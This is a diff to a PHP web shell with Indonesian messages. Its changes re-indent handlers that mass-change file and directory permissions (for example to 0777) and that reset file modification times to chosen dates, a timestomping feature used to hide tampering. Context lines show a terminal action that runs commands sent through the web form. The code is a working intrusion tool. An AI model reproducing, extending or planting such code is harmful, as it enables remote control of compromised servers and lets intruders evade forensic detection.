@@ -286,68 +286,68 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // CHMOD MASS/SINGLE (FILE + DIR)
-    if ($action === 'chmod_apply') {
-        $fileTargets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
-        $dirTargets  = isset($_POST['dir_targets'])  ? (array)$_POST['dir_targets']  : [];
-        $modeStr     = isset($_POST['chmod_mode']) ? trim($_POST['chmod_mode']) : '';
-        if ((!$fileTargets && !$dirTargets) || $modeStr === '') {
-            $messages[] = "Pilih file/dir dan isi mode chmod (misal: 0777 atau 644).";
+    
+if ($action === 'chmod_apply') {
+    $fileTargets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
+    $dirTargets  = isset($_POST['dir_targets'])  ? (array)$_POST['dir_targets']  : [];
+    $modeStr     = isset($_POST['chmod_mode']) ? trim($_POST['chmod_mode']) : '';
+    if ((!$fileTargets && !$dirTargets) || $modeStr === '') {
+        $messages[] = "Pilih file/dir dan isi mode chmod (misal: 0777 atau 644).";
+    } else {
+        $mode = octdec($modeStr);
+        foreach ($fileTargets as $t) {
+            $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
+            if (!file_exists($f)) {
+                $messages[] = "[FAIL] Target file tidak ada: $f";
+                continue;
+            }
+            if (!@chmod($f, $mode)) {
+                $messages[] = "[FAIL] Gagal chmod file $f ke $modeStr";
+            } else {
+                $messages[] = "[OK]   Berhasil chmod file $f ke $modeStr";
+            }
+        }
+        foreach ($dirTargets as $d) {
+            $dirPath = cleanPath($d);
+            if (!is_dir($dirPath)) {
+                $messages[] = "[FAIL] Target dir tidak ada: $dirPath";
+                continue;
+            }
+            if (!@chmod($dirPath, $mode)) {
+                $messages[] = "[FAIL] Gagal chmod dir $dirPath ke $modeStr";
+            } else {
+                $messages[] = "[OK]   Berhasil chmod dir $dirPath ke $modeStr";
+            }
+        }
+    }
+}
+
+// MODIFY WAKTU MASS/SINGLE (file saja)
+if ($action === 'time_apply') {
+    $targets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
+    $timeStr = isset($_POST['time_value']) ? trim($_POST['time_value']) : '';
+    if (!$targets || $timeStr === '') {
+        $messages[] = "Pilih file dan isi waktu (YYYY-MM-DD HH:MM:SS).";
+    } else {
+        $ts = strtotime($timeStr);
+        if ($ts === false) {
+            $messages[] = "Format waktu tidak valid.";
         } else {
-            $mode = octdec($modeStr); // oktal[web:40][web:38][web:93]
-            foreach ($fileTargets as $t) {
+            foreach ($targets as $t) {
                 $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
                 if (!file_exists($f)) {
-                    $messages[] = "[FAIL] Target file tidak ada: $f";
+                    $messages[] = "[FAIL] Target tidak ada: $f";
                     continue;
                 }
-                if (!@chmod($f, $mode)) {
-                    $messages[] = "[FAIL] Gagal chmod file $f ke $modeStr";
+                if (!@touch($f, $ts)) {
+                    $messages[] = "[FAIL] Gagal set waktu $f ke $timeStr";
                 } else {
-                    $messages[] = "[OK]   Berhasil chmod file $f ke $modeStr";
-                }
-            }
-            foreach ($dirTargets as $d) {
-                $dirPath = cleanPath($d);
-                if (!is_dir($dirPath)) {
-                    $messages[] = "[FAIL] Target dir tidak ada: $dirPath";
-                    continue;
-                }
-                if (!@chmod($dirPath, $mode)) {
-                    $messages[] = "[FAIL] Gagal chmod dir $dirPath ke $modeStr";
-                } else {
-                    $messages[] = "[OK]   Berhasil chmod dir $dirPath ke $modeStr";
+                    $messages[] = "[OK]   Berhasil set waktu $f ke $timeStr";
                 }
             }
         }
     }
-
-    // MODIFY WAKTU MASS/SINGLE (file saja)
-    if ($action === 'time_apply') {
-        $targets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
-        $timeStr = isset($_POST['time_value']) ? trim($_POST['time_value']) : '';
-        if (!$targets || $timeStr === '') {
-            $messages[] = "Pilih file dan isi waktu (YYYY-MM-DD HH:MM:SS).";
-        } else {
-            $ts = strtotime($timeStr);
-            if ($ts === false) {
-                $messages[] = "Format waktu tidak valid.";
-            } else {
-                foreach ($targets as $t) {
-                    $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
-                    if (!file_exists($f)) {
-                        $messages[] = "[FAIL] Target tidak ada: $f";
-                        continue;
-                    }
-                    if (!@touch($f, $ts)) {
-                        $messages[] = "[FAIL] Gagal set waktu $f ke $timeStr";
-                    } else {
-                        $messages[] = "[OK]   Berhasil set waktu $f ke $timeStr";
-                    }
-                }
-            }
-        }
-    }
+}
 
     // TERMINAL
     if ($action === 'terminal_exec') {
@@ -777,14 +777,12 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 </form>
 
-<!-- 6. CHMOD (tetap pakai checkbox di tabel di atas) -->
 <div class="box">
   <strong>CHMOD (file + dir, single / mass):</strong><br>
   <input type="text" name="chmod_mode" placeholder="misal: 0777 atau 644"><br><br>
   <button type="submit" name="action" value="chmod_apply">APPLY CHMOD (ke file/dir yang dicentang)</button>
 </div>
 
-<!-- 7. Modify waktu (pakai checkbox file di atas) -->
 <div class="box">
   <strong>Modify waktu (mtime) (file saja, single / mass):</strong><br>
   <input type="text" name="time_value" placeholder="YYYY-MM-DD HH:MM:SS, contoh: 2026-03-07 01:57:14"><br><br>
@@ -806,4 +804,5 @@ document.addEventListener('DOMContentLoaded', () => {
 
 </body>
 </html>
+
 
